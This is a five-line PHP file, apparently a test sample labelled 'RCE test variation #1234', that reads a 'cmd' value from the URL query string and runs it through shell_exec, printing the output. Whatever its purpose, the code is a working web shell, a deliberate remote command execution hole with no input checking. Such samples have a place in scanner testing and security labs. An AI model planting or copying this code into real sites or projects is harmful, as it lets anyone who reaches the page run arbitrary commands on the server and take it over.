<?php
// RCE test variation #1234
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>